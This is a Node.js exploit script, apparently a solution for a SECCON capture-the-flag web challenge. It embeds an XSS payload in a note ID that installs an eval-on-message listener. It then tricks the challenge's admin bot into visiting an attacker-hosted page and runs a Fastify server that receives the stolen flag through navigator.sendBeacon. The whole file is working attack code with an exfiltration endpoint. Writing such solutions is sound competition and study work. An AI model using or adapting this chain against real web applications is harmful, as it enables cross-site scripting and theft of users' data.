const path = require("node:path");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL =
  process.env.SECCON_BASE_URL || fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL =
  process.env.ATTACK_BASE_URL || fail("No ATTACK_BASE_URL");

if (!ATTACK_BASE_URL.startsWith("http://")) {
  fail("Invalid ATTACK_BASE_URL: the CSRF will fail");
}

const LISTEN_PORT = process.env.PORT || "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const exploit = async () => {
  const noteId =
    // XSS payload:
    `<img src=0 onerror="window.addEventListener('message',e=>eval(e.data))">` +
    // .html -> Content-Type: text/html
    // ref. https://github.com/broofa/mime/blob/main/types/standard.js
    ".html";

  if (noteId.length > 100) {
    // ref. https://github.com/delvedor/find-my-way/blob/v7.3.0/index.js#L87
    fail(`Too long id: ${noteId}`);
  }
  if (
    noteId.includes("..") ||
    noteId.includes("/") ||
    noteId.includes("\\") ||
    noteId.includes("%")
  ) {
    fail(`Invalid id: ${noteId}`);
  }

  const baseUrl = "http://web:3000";

  const reportedUrl = `${ATTACK_BASE_URL}/index.html?${new URLSearchParams({
    baseUrl,
    noteId,
  })}`;

  const res = await (
    await fetch(`${SECCON_BASE_URL}/report`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        url: reportedUrl,
      }),
    })
  ).text();
  console.log(res); // "Received :)"
};

const fastify = require("fastify")();

fastify.register(require("@fastify/static"), {
  root: path.join(__dirname, "public"),
});

fastify.post("/", async (req, reply) => {
  // Received data from navigator.sendBeacon
  console.log(req.body); // Got a flag!
  process.exit(0);
});

const start = async () => {
  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) {
        fastify.log.error(err);
        process.exit(1);
      }

      await sleep(1 * 1000);
      await exploit();
      await sleep(10 * 1000);
      fail("Failed");
    }
  );
};
start();
